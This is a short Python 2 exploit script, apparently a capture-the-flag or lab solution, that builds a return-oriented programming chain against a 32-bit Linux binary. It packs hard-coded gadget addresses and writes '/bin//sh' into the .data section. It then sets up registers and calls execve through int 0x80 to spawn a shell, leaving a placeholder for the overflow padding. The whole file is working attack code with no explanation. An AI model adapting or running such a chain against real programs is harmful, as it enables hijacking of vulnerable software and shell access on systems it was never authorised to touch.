from struct import pack

ADD_EAX_2 = pack('<I', 0x080980a7)
ADD_EAX_3 = pack('<I', 0x080980c0)
XOR_EAX_EAX = pack('<I', 0x08054c30)
INT_80 = pack('<I', 0x08048eaa)
POP_EDX = pack('<I', 0x0806f3aa)
POP_EAX = pack('<I', 0x080bc4d6)
POP_EBX = pack('<I', 0x080481c9)
POP_ECX = pack('<I', 0x080e6255)
MOV_EDX_EAX = pack('<I', 0x080a2ccd)

# Padding goes here
p = ''

p += POP_EDX
p += pack('<I', 0x080eb060) # @ .data
p += POP_EAX
p += '/bin'
p += MOV_EDX_EAX

p += POP_EDX
p += pack('<I', 0x080eb064) # @ .data + 4
p += POP_EAX
p += '//sh'
p += MOV_EDX_EAX

p += pack('<I', 0x0806f3aa) # pop edx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += XOR_EAX_EAX
p += MOV_EDX_EAX # mov dword ptr [edx], eax ; ret

p += POP_EBX # pop ebx ; ret
p += pack('<I', 0x080eb060) # @ .data
p += POP_ECX # pop ecx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += POP_EDX # pop edx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8

p += XOR_EAX_EAX
p += ADD_EAX_3
p += ADD_EAX_3
p += ADD_EAX_3
p += ADD_EAX_2
p += INT_80

print p
